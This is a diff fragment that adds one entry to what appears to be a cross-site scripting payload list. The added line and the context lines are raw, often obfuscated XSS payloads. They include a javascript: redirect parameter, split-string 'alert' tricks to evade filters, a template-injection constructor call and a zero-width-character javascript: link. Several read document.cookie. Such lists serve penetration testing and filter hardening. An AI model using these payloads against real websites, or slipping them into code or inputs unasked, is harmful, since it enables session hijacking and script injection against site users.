@@ -154,6 +154,7 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](document%2Bcookie)>
 %3E%3CD3V%0DonMOUseovEr%09=%09["BadrHere"].find(confirm)%0Dx%3Ev3dm0s
 "*alert("Hacked")*"
+'><<html onpointerover=alert(document.cookie) style=display:block>XSS</html>>
 <script>prompt(document.domain);</script>
 {{0[a='constructor'][a]('alert(1)')()}}
 <00 foo="<a%20href="javascript​:alert('XSS-Bypass')">XSS-CLick</00>--%20/
